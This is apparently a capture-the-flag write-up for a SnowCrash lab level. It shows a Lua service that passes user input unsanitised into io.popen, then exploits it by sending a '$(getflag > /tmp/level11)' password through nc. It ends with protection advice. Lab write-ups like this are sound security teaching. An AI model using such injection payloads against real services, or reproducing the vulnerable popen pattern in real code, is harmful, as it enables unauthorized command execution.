# Level11

### Tools

### How to solve it

1. After logging in using ssh at level11@(vmIP):

```
ssh level11@000.000.000.000 -p 4242
```

2. When logging in, we see a script `level11.lua` is running as a service:

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end
-- ...
```

3. The Lua server uses `io.popen("echo "..pass.." | sha1sum", "r")` which concatenates user input into a shell command. This allows command injection.

4. We can exploit this by injecting a command that redirects the output of `getflag` to a file we can read.

```bash
level11@SnowCrash:~$ nc localhost 5151
Password: $(getflag > /tmp/level11)
Erf nope..
level11@SnowCrash:~$ cat /tmp/level11
```

### How to protect

- Avoid using `io.popen` with unvalidated user input.
- Use a native Lua library for hashing or safely escape all shell arguments.

